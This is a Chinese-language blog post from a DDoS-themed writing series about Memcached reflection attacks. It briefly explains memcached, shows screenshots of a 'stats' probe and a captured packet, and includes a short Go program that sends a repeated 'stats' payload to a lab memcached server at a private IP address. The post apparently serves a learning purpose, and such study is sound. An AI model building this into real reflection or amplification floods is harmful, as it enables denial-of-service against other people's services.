---
author: Sunny Tsai
title: "[Day 24] 閑的沒事 - Memcached反射攻擊"
date: 2023-10-07
math: true
tags: [
    "cloud",
    "memcached",
]
categories: [
    "2023鐵人賽"
]
series: ["2023鐵人賽-DDOS：閑的沒事就開始DDOS"]
---
# Memcached
Memcached跟Redis都是常見的快取（Caching）和分佈式數據儲存解決方案，兩者都是in-memory database，兩者都提供使用者低延遲、高效率來存取資料。兩者通常也都忘記設定權限。

# 測試
stats
![](https://imgur.com/Yg2Napz.png)

## 攔截封包
發送一個stats反射的封包
![](https://imgur.com/VBt7LGB.png)

# code
先用Dial發送一個
```
package main

import (
	"fmt"
	"log"
	"net"
	"time"
)

func main() {
	targetIP := "10.211.55.10"
	targetPort := 11211

	// 构建TCP连接
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", targetIP, targetPort), 10*time.Second)
	if err != nil {
		log.Fatal(err)
	}
	defer conn.Close()

	// 构建Payload数据
	payload := "stats\r\nstats\r\nstats\r\nstats items\r\nstats\r\nstats\r\nstats\r\nstats\r\nstats\r\nstats\r\nstats\r\nstats\r\nstats\r\nstats\r\n"

	// 发送数据包
	_, err = conn.Write([]byte(payload))
	if err != nil {
		log.Fatal(err)
	}

	fmt.Println("Packet sent successfully!")
}
```
